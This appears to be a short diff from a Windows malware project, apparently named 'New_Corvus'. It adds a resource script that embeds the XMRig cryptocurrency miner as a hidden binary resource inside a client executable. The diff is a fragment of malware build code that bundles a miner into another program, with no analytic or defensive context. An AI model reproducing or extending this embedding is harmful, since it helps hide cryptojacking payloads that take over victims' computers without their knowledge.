@@ -1,0 +1,2 @@
+#include "../include/resources.h"
+EMBEDDED_XMRIG RCDATA "C:/Users/Malware/Desktop/New_Corvus/Client/resources/xmrig.exe"
